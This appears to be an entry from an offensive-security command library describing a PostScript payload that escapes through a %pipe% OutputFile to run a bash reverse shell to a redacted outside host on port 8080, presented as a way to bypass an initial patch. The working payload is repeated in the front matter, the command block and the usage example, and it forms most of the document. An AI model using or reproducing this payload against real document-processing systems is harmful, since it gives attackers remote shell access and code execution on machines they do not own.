---
data: >-
  %!PS

  userdict /setpagedevice undef

  legal

  { null restore } stopped { pop } if

  legal

  mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/██████████/8080 0>&1')
  currentdevice putdeviceprops
tags:
  - rce
  - reverse-shell
type: command
executor: postscript
platforms:
  - Web
id: f6729ef3-212a-434c-bc2e-2fcc9fa34a03
created_at: '2025-12-11T06:10:31.594Z'
updated_at: '2025-12-11T06:10:31.594Z'
verified: false
validated: true
submitted: true
---
# postscript-bash-reverse-shell

## Command

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/██████████/8080 0>&1') currentdevice putdeviceprops
```

## Description

Alternative Postscript payload that executes a bash reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `OutputFile` | Specifies pipe to execute bash code | Yes |

## Examples

### Basic Usage

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%bash -c 'bash -i >& /dev/tcp/██████████/8080 0>&1') currentdevice putdeviceprops
```

## Expected Output

Establishes a reverse shell connection.

## Related

- [[commands/postscript-python-reverse-shell]]
- [[procedures/Bypass-Initial-Patch-with-Alternative-Payload]]
